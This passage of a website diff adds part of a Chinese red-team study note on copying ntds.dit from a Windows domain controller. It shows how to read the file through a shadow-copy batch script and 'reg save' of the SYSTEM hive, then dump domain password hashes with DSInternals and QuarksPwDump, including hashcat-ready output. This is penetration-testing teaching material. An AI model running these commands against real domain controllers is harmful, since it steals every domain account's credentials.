+<pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system&#39;
+Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -Bootkey $key | Out-File output_hash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>或者导出 hashcat 支持的 hash，并保存在 output_hashcat.txt 文件里</p>
+<pre class="line-numbers language-none"><code class="language-none">$key &#x3D; Get-Bootkey -SystemHivePath &#39;C:\system.hive&#39;
+Get-ADDBAccount -All -DBPath &#39;C:\ntds.dit&#39; -BootKey $key | Format-Custom -View HashcatNT | Out-File output_hashcat.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="vshaow-和-QuarksPwDump"><a href="#vshaow-和-QuarksPwDump" class="headerlink" title="vshaow 和 QuarksPwDump"></a>vshaow 和 QuarksPwDump</h3><p>在正常的域环境中，ntds.dit 文件里包含大量的信息，体积较大，不方便保存到本地。</p>
+<p>如果域控制器上没有安装杀毒软件，攻击者就能直接进入域控制器，导出 ntds.dit 并获得域账号和域散列值，而不需要将 ntds.dit 保存到本地。</p>
+<p>QuarksPwDump 可以快速、安全、全面地读取全部域账号和域散列值。</p>
+<p>QuarksPwDump 下载地址：<a target="_blank" rel="noopener" href="https://github.com/tuthimi/quarkspwdump/tree/master/Release">https://github.com/tuthimi/quarkspwdump/tree/master/Release</a></p>
+<p>ShadowCopy.bat 使用微软的卷影拷贝技术，能够复制被锁定的文件及被其他程序打开的文件，代码如下</p>
+<pre class="line-numbers language-none"><code class="language-none">setlocal
+if NOT &quot;%CALLBACK_SCRIPT%&quot;&#x3D;&#x3D;&quot;&quot; goto :IS_CALLBACK
+set SOURCE_DRIVE_LETTER&#x3D;%SystemDrive%
+set SOURCE_RELATIVE_PATH&#x3D;windows\ntds\ntds.dit
+set DESTINATION_PATH&#x3D;%~dp0
+@echo ...Determine the scripts to be executed&#x2F;generated...
+set CALLBACK_SCRIPT&#x3D;%~dpnx0
+set TEMP_GENERATED_SCRIPT&#x3D;GeneratedVarsTempScript.cmd
+@echo ...Creating the shadow copy...
+&quot;%~dp0vshadow.exe&quot; -script&#x3D;%TEMP_GENERATED_SCRIPT% -exec&#x3D;&quot;%CALLBACK_SCRIPT%&quot; %SOURCE_DRIVE_LETTER%
+del &#x2F;f %TEMP_GENERATED_SCRIPT%
+@goto :EOF
+:IS_CALLBACK
+setlocal
+@echo ...Obtaining the shadow copy device name...
+call %TEMP_GENERATED_SCRIPT%
+@echo ...Copying from the shadow copy to the destination path...
+copy &quot;%SHADOW_DEVICE_1%\%SOURCE_RELATIVE_PATH%&quot; %DESTINATION_PATH%
+reg save hklm\system system.hive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>vshadow.exe 是从 Windows SDK 中提取出来的，需要先安装 Windows SDK，下载地址：<a target="_blank" rel="noopener" href="https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/">https://developer.microsoft.com/en-us/windows/downloads/sdk-archive/</a></p>
+<p>Windows SDK 下载安装完后，找到 vshadow.exe ，我这里的路径是：</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Microsoft SDKs\Windows\v7.1\Bin\x64\vsstools\vshadow.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将这三个文件放到同一个文件夹里后，运行 ShadowCopy.bat 文件，之后可以看到导出了 ntds.dit 和 system.hive 文件</p>
+<p>使用 esentutl 修复导出的 ntds.dit 文件</p>
+<pre class="line-numbers language-none"><code class="language-none">esentutl &#x2F;p &#x2F;o ntds.dit<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>最后通过 QuarksPwDump.exe 导出域账号和散列值</p>
+<pre class="line-numbers language-none"><code class="language-none">QuarksPwDump.exe -dhd -sf system.hive -nt ntds.dit -o log.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在 log 里就能看到导出的密码哈希了</p>
+<blockquote>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1752212">https://cloud.tencent.com/developer/article/1752212</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/251267.html">https://www.freebuf.com/articles/network/251267.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45742511/article/details/117301437">https://blog.csdn.net/qq_45742511/article/details/117301437</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/">https://www.mondayice.com/2021/07/10/cobalt-strike-intranet-penetration-domain-control-attack/</a></p>
 <p>更多信息欢迎关注我的微信公众号：TeamsSix</p>
 </blockquote>
-<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>
+<p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>
 
                 
             </div>
@@ -620,7 +730,7 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://www.teamssix.com/20210630-113201.html">https://www.teamssix.com/20210630-113201.html</a>
+                    <a href="https://www.teamssix.com/210909-215110.html">https://www.teamssix.com/210909-215110.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -712,7 +822,7 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
         repo: 'Gitalk',
         owner: 'teamssix',
         admin: "teamssix",
-        id: '2021-06-30T11-32-01',
+        id: '2021-09-09T21-51-10',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -738,16 +848,17 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/210701-161347.html">
+                <a href="/210909-215110.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210630172410.png" class="responsive-img" alt="【内网学习笔记】13、内网中绕过无法上传文件限制">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908155944.png" class="responsive-img" alt="【内网学习笔记】26、ntds.dit 的提取与散列值导出">
                         
-                        <span class="card-title">【内网学习笔记】13、内网中绕过无法上传文件限制</span>
+                        <span class="card-title">【内网学习笔记】26、ntds.dit 的提取与散列值导出</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -757,9 +868,9 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-01
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-09
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -772,6 +883,7 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -798,12 +910,12 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/210616-133645.html">
+                <a href="/210908-105249.html">
                     <div class="card-image">
                         
-                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210616125657.png" class="responsive-img" alt="【随笔】Windows 11 的安装尝鲜">
+                        <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/20210908104558.png" class="responsive-img" alt="【内网学习笔记】25、Exchange 邮件服务器">
                         
-                        <span class="card-title">【随笔】Windows 11 的安装尝鲜</span>
+                        <span class="card-title">【内网学习笔记】25、Exchange 邮件服务器</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -814,14 +926,14 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-06-16
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-09-08
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E9%9A%8F%E7%AC%94/" class="post-category">
-                                    随笔
+                            <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="post-category">
+                                    内网学习笔记
                                 </a>
                             
                             
@@ -831,12 +943,16 @@ copy &#x2F;b teamssix* fscan.exe		# 适用于 Windows<span aria-hidden="true" cl
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Windows-11/">
-                        <span class="chip bg-color">Windows 11</span>
+                    <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+                        <span class="chip bg-color">学习笔记</span>
                     </a>
                     
-                    <a href="/tags/%E5%B0%9D%E9%B2%9C/">
-                        <span class="chip bg-color">尝鲜</span>
+                    <a href="/tags/%E7%BA%A2%E9%98%9F/">
+                        <span class="chip bg-color">红队</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%86%85%E7%BD%91/">
+                        <span class="chip bg-color">内网</span>
                     </a>
                     
                 </div>
